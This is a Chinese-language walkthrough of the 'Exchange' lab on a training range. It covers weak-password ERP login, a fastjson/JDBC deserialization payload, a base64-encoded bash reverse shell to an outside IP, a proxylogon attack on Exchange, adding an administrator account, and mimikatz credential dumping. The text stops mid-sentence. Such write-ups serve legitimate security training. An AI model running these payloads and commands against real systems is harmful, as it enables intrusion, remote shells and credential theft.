## 文章

[春秋云境·Exchange](https://fushuling.com/index.php/2023/10/03/春秋云境·exchange/)

[春秋云境靶场记录-Exchange](https://zysgmzb.club/index.php/archives/238)

[春秋云镜 Exchange Writeup](https://exp10it.cn/2023/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-exchange-writeup/)

## 打靶过程

先`fscan`收集一下信息

```bash
./fscan -h 39.99.226.76 -p 1-65535
```

```bash
[*] Icmp alive hosts len is: 1
39.99.226.76:8000 open
[*] alive ports len is: 1
start vulscan
[*] WebTitle: http://39.99.226.76:8000  code:302 len:0      title:None 跳转url: http://39.99.226.76:8000/login.html
[*] WebTitle: http://39.99.226.76:8000/login.html code:200 len:5662   title:Lumia ERP
```

有一个Lumia ERP

admin/123456 弱口令登录

![image-20231013154259915](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231013154259915.png)

搜索一下发现是华夏ERP

有fastjson反序列化漏洞

版本为2.3

![image-20231013154515280](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231013154515280.png)

到github上，看看有什么java依赖

```xml
<dependencies>
		<dependency>
			<groupId>com.gitee.starblues</groupId>
			<artifactId>springboot-plugin-framework</artifactId>
			<version>2.2.1-RELEASE</version>
		</dependency>
		<dependency>
			<groupId>com.gitee.starblues</groupId>
			<artifactId>springboot-plugin-framework-extension-mybatis</artifactId>
			<version>2.2.1-RELEASE</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>com.alibaba</groupId>
			<artifactId>fastjson</artifactId>
			<version>1.2.55</version>
		</dependency>
		<dependency>
			<groupId>mysql</groupId>
			<artifactId>mysql-connector-java</artifactId>
			<version>5.1.30</version>
		</dependency>
		<!--http-->
		<dependency>
			<groupId>org.apache.httpcomponents</groupId>
			<artifactId>httpclient</artifactId>
			<version>4.5.2</version>
		</dependency>
		<dependency>
			<groupId>net.sourceforge.jexcelapi</groupId>
			<artifactId>jxl</artifactId>
			<version>2.6.12</version>
		</dependency>
		<!-- lombok -->
		<dependency>
			<groupId>org.projectlombok</groupId>
			<artifactId>lombok</artifactId>
			<version>1.18.12</version>
		</dependency>
		<!-- 日志 -->
		<dependency>
			<groupId>org.apache.logging.log4j</groupId>
			<artifactId>log4j-to-slf4j</artifactId>
			<version>2.10.0</version>
			<scope>compile</scope>
		</dependency>
		<dependency>
			<groupId>org.slf4j</groupId>
			<artifactId>jul-to-slf4j</artifactId>
			<version>1.7.25</version>
			<scope>compile</scope>
		</dependency>
		<dependency>
			<groupId>com.baomidou</groupId>
			<artifactId>mybatis-plus-boot-starter</artifactId>
			<version>3.0.7.1</version>
		</dependency>
		<dependency>
			<groupId>io.springfox</groupId>
			<artifactId>springfox-swagger2</artifactId>
			<version>2.7.0</version>
			<scope>compile</scope>
		</dependency>
		<dependency>
			<groupId>com.github.xiaoymin</groupId>
			<artifactId>swagger-bootstrap-ui</artifactId>
			<version>1.6</version>
		</dependency>
	</dependencies>
```

有log4j，尝试一些注入点，似乎没有什么用

还有fastjson，版本为1.2.55，以及jdbc

```xml
		<dependency>
			<groupId>com.alibaba</groupId>
			<artifactId>fastjson</artifactId>
			<version>1.2.55</version>
		</dependency>
		<dependency>
			<groupId>mysql</groupId>
			<artifactId>mysql-connector-java</artifactId>
			<version>5.1.30</version>
		</dependency>
```

可以通过fastjson配合jdbc来打

恶意mysql服务器

https://github.com/fnmsd/MySQL_Fake_Server

config.json

```json
{
    "config":{
        "ysoserialPath":"ysoserial-all.jar",
        "javaBinPath":"java",
        "fileOutputDir":"./fileOutput/",
        "displayFileContentOnScreen":true,
        "saveToFile":true
    },
    "fileread":{
        "win_ini":"c:\\windows\\win.ini",
        "win_hosts":"c:\\windows\\system32\\drivers\\etc\\hosts",
        "win":"c:\\windows\\",
        "linux_passwd":"/etc/passwd",
        "linux_hosts":"/etc/hosts",
        "index_php":"index.php",
        "ssrf":"https://www.baidu.com/",
        "__defaultFiles":["/etc/hosts","c:\\windows\\system32\\drivers\\etc\\hosts"]
    },
    "yso":{
        "Jdk7u21":["Jdk7u21","calc"],
        "CommonsCollections7":["CommonsCollections7","bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xODIuOTIuMTYxLjIyMi83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}"]
    }
}

```

exp

```json
{ "name": { "@type": "java.lang.AutoCloseable", "@type": "com.mysql.jdbc.JDBC4Connection", "hostToConnectTo": "182.92.161.222", "portToConnectTo": 3306, "info": { "user": "CommonsCollections7", "password": "pass", "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor", "autoDeserialize": "true", "NUM_HOSTS": "1" } }
```

```http
/user/list?search=%7B%20%22name%22:%20%7B%20%22@type%22:%20%22java.lang.AutoCloseable%22,%20%22@type%22:%20%22com.mysql.jdbc.JDBC4Connection%22,%20%22hostToConnectTo%22:%20%22182.92.161.222%22,%20%22portToConnectTo%22:%203306,%20%22info%22:%20%7B%20%22user%22:%20%22CommonsCollections7%22,%20%22password%22:%20%22pass%22,%20%22statementInterceptors%22:%20%22com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%22,%20%22autoDeserialize%22:%20%22true%22,%20%22NUM_HOSTS%22:%20%221%22%20%7D%20%7D 
```

nc监听

```bash
nc -lvp 7777
```

获取flag

![image-20231013165014762](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231013165014762.png)

之后传入frp、fscan，进行代理和扫描

看一下网卡

```bash
ifconfig
```

![image-20231013165646270](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231013165646270.png)

用fscan扫一下

```
(icmp) Target 172.22.3.12     is alive
(icmp) Target 172.22.3.2      is alive
(icmp) Target 172.22.3.9      is alive
(icmp) Target 172.22.3.26     is alive
[*] Icmp alive hosts len is: 4
172.22.3.9:808 open
172.22.3.12:80 open
172.22.3.12:22 open
172.22.3.12:8000 open
172.22.3.2:88 open
172.22.3.9:445 open
172.22.3.2:445 open
172.22.3.26:445 open
172.22.3.9:443 open
172.22.3.26:139 open
172.22.3.9:8172 open
172.22.3.9:139 open
172.22.3.2:139 open
172.22.3.26:135 open
172.22.3.9:135 open
172.22.3.2:135 open
172.22.3.9:81 open
172.22.3.9:80 open
[*] alive ports len is: 18
start vulscan
[*] NetInfo:
[*]172.22.3.2
   [->]XIAORANG-WIN16
   [->]172.22.3.2
[*] NetInfo:
[*]172.22.3.26
   [->]XIAORANG-PC
   [->]172.22.3.26
[*] NetBios: 172.22.3.26     XIAORANG\XIAORANG-PC           
[*] NetInfo:
[*]172.22.3.9
   [->]XIAORANG-EXC01
   [->]172.22.3.9
[*] 172.22.3.2  (Windows Server 2016 Datacenter 14393)
[*] NetBios: 172.22.3.2      [+]DC XIAORANG-WIN16.xiaorang.lab      Windows Server 2016 Datacenter 14393 
[*] NetBios: 172.22.3.9      XIAORANG-EXC01.xiaorang.lab         Windows Server 2016 Datacenter 14393 
[*] WebTitle: http://172.22.3.12        code:200 len:19813  title:lumia
[*] WebTitle: http://172.22.3.12:8000   code:302 len:0      title:None 跳转url: http://172.22.3.12:8000/login.html
[*] WebTitle: http://172.22.3.12:8000/login.html code:200 len:5662   title:Lumia ERP
[*] WebTitle: http://172.22.3.9:81      code:403 len:1157   title:403 - 禁止访问: 访问被拒绝。
[*] WebTitle: https://172.22.3.9:8172   code:404 len:0      title:None
[*] WebTitle: http://172.22.3.9         code:403 len:0      title:None
[*] WebTitle: https://172.22.3.9        code:302 len:0      title:None 跳转url: https://172.22.3.9/owa/
[*] WebTitle: https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f&reason=0 code:200 len:28237  title:Outlook
```

172.22.3.9为exchange服务，用proxylogon来打

```bash
proxychains4 python2 proxylogon.py 172.22.3.9 administrator@xiaorang.lab
```

然后添加用户进行rdp

```
net user Ki1ro @Abc807723 /add
net localgroup administrators Ki1ro /add
```

成功远程桌面连接

![image-20231013173430642](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231013173430642.png)

获取flag

![image-20231013173545249](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231013173545249.png)

因为是本地Administrator权限，可以用mimikatz抓一下域用户密码,用管理员权限打开

```bash
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > 1.txt
```

再用

![image-20231013181359320](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231013181359320.png)